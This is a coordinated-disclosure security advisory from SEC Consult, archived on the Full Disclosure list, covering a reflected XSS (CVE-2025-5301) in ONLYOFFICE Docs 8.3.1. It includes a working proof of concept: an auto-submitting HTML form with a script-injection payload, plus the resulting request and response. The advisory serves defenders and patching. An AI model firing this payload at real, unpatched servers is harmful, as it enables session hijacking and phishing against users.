---
title: SEC Consult SA-20250612-0 :: Reflected Cross-Site Scripting in ONLYOFFICE Docs (DocumentServer)
url: https://seclists.org/fulldisclosure/2025/Jun/18
source: Full Disclosure
date: 2025-06-19
fetch_date: 2025-10-06T22:57:09.530764
---

# SEC Consult SA-20250612-0 :: Reflected Cross-Site Scripting in ONLYOFFICE Docs (DocumentServer)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20250612-0 :: Reflected Cross-Site Scripting in ONLYOFFICE Docs (DocumentServer)

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 12 Jun 2025 07:39:37 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20250612-0 >
=======================================================================
              title: Reflected Cross-Site Scripting
            product: ONLYOFFICE Docs (DocumentServer)
 vulnerable version: <=8.3.1
      fixed version: 8.3.2 or higher
         CVE number: CVE-2025-5301
             impact: Medium
           homepage: https://www.onlyoffice.com/
                     https://github.com/ONLYOFFICE/DocumentServer/
              found: 2025-02-14
                 by: Max Rull
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"ONLYOFFICE Docs* is a free collaborative online office suite comprising
viewers and editors for texts, spreadsheets and presentations, forms and
PDF, fully compatible with Office Open XML formats:
.docx, .xlsx, .pptx and enabling collaborative editing in real time.
ONLYOFFICE Docs can be used as a part of ONLYOFFICE Workspace or with
third-party sync&share solutions (e.g. Nextcloud, ownCloud, Seafile) to
enable collaborative editing within their interface. It has three editions
- Community, Enterprise, and Developer.
* Starting from version 6.0, Document Server is distributed under a
new name - ONLYOFFICE Docs."

Source: https://github.com/ONLYOFFICE/DocumentServer

Business recommendation:
------------------------
The vendor provides a patched version v8.3.2 (or higher) which should be
installed immediately.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) Reflected XSS via arbitrary query parameters (CVE-2025-5301)
An XSS vulnerability exists in the /hosting/wopi/:documentType/:mode
endpoint due to improper sanitization of user-controlled query parameters.
Attackers can inject malicious scripts via crafted HTTP POST requests,
which are reflected in the server's HTML response.

Technical flow:
- The Express.js handler (wopiClient.getEditorHtml) passes raw query
  parameters (req.query) to the rendering context without sanitization.
  Code reference (server.js line 283):
  https://github.com/ONLYOFFICE/server/blob/02ae05c/DocService/sources/server.js#L283

- Unsafe parameter handling by directly reading from req.query (wopiClient.js line 573):
  https://github.com/ONLYOFFICE/server/blob/02ae05c/DocService/sources/wopiClient.js#L573

- Template injection in editor-wopi.ejs (line 292) embeds parameters via:
  var queryParams = <%- JSON.stringify(queryParams) %>;
  Code reference (editor-wopi.ejs line 292):
  https://github.com/ONLYOFFICE/web-apps/blob/090ef83/apps/api/wopi/editor-wopi.ejs#L292

Impact:
- Execution of attacker-controlled scripts in victim's browser
- Session hijacking, phishing attacks, or UI manipulation
- Risks compounded by missing CSP/X-Frame-Options headers

Proof of concept:
-----------------
1) Reflected XSS via arbitrary query parameters (CVE-2025-5301)
To demonstrate the vulnerability, it is sufficient to open the following
HTML document in a browser:

```
<html>
 <body>
 <form action="https://one.office.example.com/hosting/wopi/word/edit?dchat=asdasd</script><script>alert('XSS')</script>"
method="POST">
 <input type="submit" value="Submit request" />
 </form>
 <script>
 history.pushState('', '', '/');
 document.forms[0].submit();
 </script>
 </body>
</html>
```

When opening the HTML document, it automatically issues an HTTP POST request to the
OnlyOffice Docs server located at one.office.example.com. Because the requested
API endpoint does not require any authentication and has no anti-CSRF mechanisms
or CSP in place, the browser will display the response and execute the reflected
JavaScript code. As the content of any chosen query parameter gets reflected,
the parameter "dchat" can be chosen to inject the JavaScript payload into.

The following request gets sent when opening the HTML document triggered by the
POST form:
```
POST /hosting/wopi/word/edit?dchat=asdasd</script><script>alert('XSS')</script> HTTP/1.1
Host: one.office.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

The server responds with the following HTML document:
```
HTTP/2 200 OK
Date: Fri, 14 Feb 2025 14:43:44 GMT
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Etag: W/"6716-b+9JJ5PtBd9kmLY/ZdhVwyGtBc"
Strict-Transport-Security: max-age=31536000; includeSubDomains

<!DOCTYPE html>
<html>
<head runat="server">
[...]
var queryParams = {"dchat":"asdasd</script><script>alert('XSS')</script>"};
[...]
</head>
<body>
[...]
</body>
</html>
```

When the response is rendered in the victim's browser, the injected
JavaScript payload (`alert('XSS')`) is executed.

<xss_poc.png>

Vulnerable / tested versions:
-----------------------------
The following version has been tested and confirmed to be vulnerable:
* ONLYOFFICE DocumentServer 8.3.1 (latest release at the time of testing)

Release details: https://github.com/ONLYOFFICE/DocumentServer/releases/tag/v8.3.1

Vendor contact timeline:
------------------------
2025-03-06: Contacting vendor through marketing () onlyoffice com (to request
            HackerOne access according to ONLYOFFICE blog)
2025-03-08: Resending initial contact email to security () onlyoffice com as well,
            preferring email contact instead of HackerOne.
2025-03-10: Vendor invites us to bounty program. We follow-up regarding HackerOne
            policies.
2025-03-14: Submitting advisory via HackerOne.
2025-03-27: Vendor responds that they are already working on it and keep us
            informed. A second message mentions that a fix has been commited to
            version 8.3.2 branch.
2025-03-27: Verified that patch is fixing the issue.
2025-03-31: Asking vendor to schedule the release of the advisory and who will
            assign CVE number.
2025-04-04: Vendor tells us we can assign a CVE and closes the ticket.
2025-06-12: Public release of security advisory.

Solution:
---------
The vendor provides a patched version v8.3.2 (or higher) which can be downloaded
from:
https://github.com/ONLYOFFICE/DocumentServer/

Workaround:
-----------
None

Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the atta...